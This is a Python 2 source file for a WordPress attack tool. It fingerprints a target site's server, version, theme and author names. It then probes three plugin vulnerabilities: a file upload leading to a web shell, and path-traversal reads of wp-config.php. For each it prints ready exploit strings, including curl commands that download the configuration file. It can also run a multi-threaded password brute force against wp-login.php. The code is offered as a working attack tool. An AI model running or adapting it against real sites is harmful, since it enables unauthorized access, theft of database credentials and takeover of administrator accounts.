import requests
import argparse
import re
import time 
import threading
from multiprocessing import Queue, Process
from multiprocessing.sharedctypes import Value
import threading



class WordPress_Scan():

	def __init__(self,dict):
		self.url = dict['url']
		self.brute = dict['brute']
		self.username = dict['uname']
		self.pwdfile = dict['pwd']
		self.count=0
		self.MixProccess = dict['proccess']
		self.Mixthread = dict['threads']
		

	# def Brute_Force(self):
	# 	print "start Brute_Force......"
 	# 	self.path4 = "http://{0}".format(self.url)+'/wp-login.php'
 	# 	for self.temp in open(self.pwdfile):
	# 		self.passwd = self.temp.strip()
	# 		self.payload = {'log':self.username,'pwd':self.passwd,'redirect_to':''}
	# 		self.bre_re = requests.post(self.path4, data = self.payload)
	# 		if (self.bre_re.text == ''):
	# 			print "\33[32m[+] test password %s : success !\33[0m" %self.passwd
	# 			break
	# 		else:
	# 			print "[-] test password %s : fail" %self.passwd

	def bruted(self,url,PwdQueue,LogQueue,MixProccess,KeyFlag,recypwdqueue):
		thread = threading.current_thread()
		while 1:
			#print "%s" %KeyFlag.value
			#print "%s" %PwdQueue.empty()
			#print "%s" %PwdQueue.qsize()
			if(KeyFlag.value):
				#print "%s+1"%thread.getName()
				break
			if(not PwdQueue.empty()):
				payload = PwdQueue.get()
				#print "%s" %payload
				#print "%s+%s"%(thread.getName(),payload)
			#elif(not recypwdqueue.empty()):
			#	payload = PwdQueue.get()
			else:
				break
			re = requests.post(url,data = payload)
			if(re.text == ''):
				print "\33[31mpassword :%s success !\33[0m" %payload['pwd']
				KeyFlag.value = 1
			else:
				print "password :%s fali" %payload['pwd']
				pass

	def task(self,url,PwdQueue,Mixthread,LogQueue,MixProccess,KeyFlag,recypwdqueue):
		ProgramThread = []
		for i in range(Mixthread):
			T = threading.Thread(target = self.bruted,args = (url,PwdQueue,LogQueue,MixProccess,KeyFlag,recypwdqueue,))
			T.setDaemon(True)
			T.start()
			#time.sleep(1)
			#print T.getName()
			ProgramThread.append(T)
		for t in ProgramThread:
			t.join()

	def CreatPwdQueue(self,PwdQueue,path,username):
		pwdtext = open(path)
		for line in pwdtext:
			pwd = line.strip()
			if (pwd):
				payload = {'log':username,'pwd':pwd,'redirect_to':''}
				PwdQueue.put(payload)
		pwdtext.close()
		#print '1'
		PwdQueue.cancel_join_thread() 

	def Brute_Force(self):
		print "start Brute_Force......"
		self.path4 = "http://{0}".format(self.url)+'/wp-login.php'
		self.PwdQueue = Queue(maxsize = 20000)
		self.LogQueue = Queue()       										#To be added
		self.recypwdqueue = Queue()
		self.KeyFlag = Value('b', 0)									  	#To be added
		Brute_ReadDict = threading.Thread(target = self.CreatPwdQueue,args = (self.PwdQueue,self.pwdfile,self.username,))
		Brute_ReadDict.start()
		#threading.Thread(target = PrintLog,args = (LogQueue,)).start()
		BruProcesses = []
		start = time.time()
		for count in range(self.MixProccess):
			cn = Process(target = self.task,args = (self.path4,self.PwdQueue,self.Mixthread,self.LogQueue,self.MixProccess,self.KeyFlag,self.recypwdqueue))
			cn.daemon = True
			cn.start()
			BruProcesses.append(cn)
		for st in BruProcesses:
			st.join()
		end = time.time()
		print "Brute_Force_Time: %f s" % (end - start)


	def VersionScan(self):
		self.Version_Path =  "http://{0}".format(self.url)+'/readme.html'
		self.Version_Page = requests.get(self.Version_Path)
		self.Version_Page.encoding='utf-8'
		if(self.Version_Page.status_code == 200):
			self.Version_text = self.Version_Page.text
			#print self.Version_text
			self.reg = r'<br />(.+?)\n</h1>'
			self.RegEx = re.compile(self.reg,re.S)
			self.Version = re.findall(self.RegEx,self.Version_text)
			#for line in self.Version:
				#print "Wordpress Version:%s" %line.encode("utf-8")
			if(len(self.Version)>0):
				print "Wordpress Version:%s" %self.Version[0].encode("utf-8")
	def ThemesScan(self):
		ThemesPath = "http://{0}".format(self.url)
		self.URL_Page = requests.get(ThemesPath)
		if(self.URL_Page.status_code == 200):
			URL_Page_text = self.URL_Page.text
			reg = r'/wp-content/themes/(.*?)/'
			RegEx = re.compile(reg)
			themes = re.findall(RegEx,URL_Page_text)
			if(len(themes)>0):
				print "Wordpress Themes:%s" %themes[0]

	def Server_Scan(self):
		Server_Path = "http://{0}".format(self.url)
		self.ReServer = requests.get(Server_Path)
		if(self.ReServer.status_code == 200):
			print "Wordpress Server Info:%s" %self.ReServer.headers['server']	

	def AuthorScan(self):
		AuthorPath = "http://{0}".format(self.url)+'?feed=rss2'
		self.ReAuthor = requests.get(AuthorPath)
		if(self.ReAuthor.status_code == 200):
			Author_text = self.ReAuthor.text
			reg =  r'<dc:creator><!\[CDATA\[(.*?)\]\]></dc:creator>'
			RegEx = re.compile(reg)
			Author_list= re.findall(reg,Author_text)
			if(len(Author_list)>0):
				print "Wordpress Author maybe:%s" %Author_list[0]


	def scan(self):
		print "Start Scan......"
		print "Scan URL: %s\n\n" %"http://{0}".format(self.url)
		self.Server_Scan()
		self.VersionScan()
		self.ThemesScan()
		self.AuthorScan()
		print "Start Vulnerability......"
		#Wordpress Plugins jQuery Html5 File Upload
		self.path1 =   "http://{0}".format(self.url)+'/wp-admin/admin-ajax.php?action=load_ajax_function'
		self.path2 =  "http://{0}".format(self.url)+'/wp-content/plugins/jquery-html5-file-upload/'
		self.re1= requests.get(self.path2)
		if(self.re1.status_code == 403 or self.re1.status_code == 200):
			self.re2 = requests.get(self.path1)
			if(self.re2.text.find('{"files":[]}') != -1):
				print "\33[31m"'[+]  Wordpress Plugins jQuery Html5 File Upload'"\033[0m"
 				print "Exploit: \n\t""\33[32m"'<form method="POST" action="test.com/ enctype="multipart/form-data"> <input type="file" name="files[]" /><button>Upload</button>'"\033[0m"
 				print "Shell Access :\n\t\33[32m http://www.test.com/wp-content/uploads/files/guest/shell.php \033[0m"
 				self.count+=1
 		#Wordpress Plugin HB Audio Gallery Lite - Arbitrary File Download
 		self.path3 = "http://{0}".format(self.url)+'/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php'
 		self.re3 = requests.get(self.path3)
 		if(self.re3.status_code ==  200):
 			print "\33[31m"'[+]  Wordpress Plugin HB Audio Gallery Lite - Arbitrary File Download'"\033[0m"
 			print "Exploit: \n\t""\33[32m"'http://www.test.com/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10'"\033[0m"
 			self.count+=1

 		#WordPress Memphis Document Library Plugin 3.1.5 Path Disclosure
 		self.path5 = "http://{0}".format(self.url)+'/wp-content/plugins/memphis-documents-library/mdocs-downloads.php'
 		self.path6 = "http://{0}".format(self.url)+'?mdocs-img-preview=../../../wp-config.php -o example-wp-config.php'
 		self.re4 = requests.get(self.path5)
 		if(self.re4.status_code == 200):
 			self.re5 = requests.get(self.path6)
 			if(self.re5.status_code==200):
 				print  "\33[31m"'[+]  WordPress Memphis Document Library Plugin 3.1.5 Path Disclosure'"\033[0m"
 				print "Exploit: \n\t""\33[32m"'curl http://example.site.com/?mdocs-img-preview=../../../wp-config.php -o example-wp-config.php'"\033[0m"
 				print " \t""\33[32m"'curl http://example.site.com/mdocs-posts/?mdocs-img-preview=../../../wp-config.php -o example-wp-config.php'"\033[0m"
 				self.count+=1
 		if(self.count == 0):
 			print "\33[32mNo Vulnerability Found\33[0m"

 		if(self.brute == True):
 			self.Brute_Force()

 	


if __name__  == '__main__':
	parser = argparse.ArgumentParser(prog = 'Wordpress scan',usage = 'scan.py [options]',add_help = False)
	parser.add_argument('-u',dest = 'url',help = 'input url')
	parser.add_argument('-h',action = 'help',help = 'output help')
	parser.add_argument('-b',dest = 'brute',action = 'store_true',default = False,help = 'brute force')
	parser.add_argument('-n',dest = 'uname',help = 'username')
	parser.add_argument('-d',dest =  'pwd',help  = 'password.txt')
	parser.add_argument('-p',dest = 'proccess',type = int,default = 2,help = 'proccess num')
	parser.add_argument('-t',dest = 'threads',type = int, default = 2,help = 'threads num')
	args = parser.parse_args()
	dict = args.__dict__
	wpscan = WordPress_Scan(dict)
	wpscan.scan()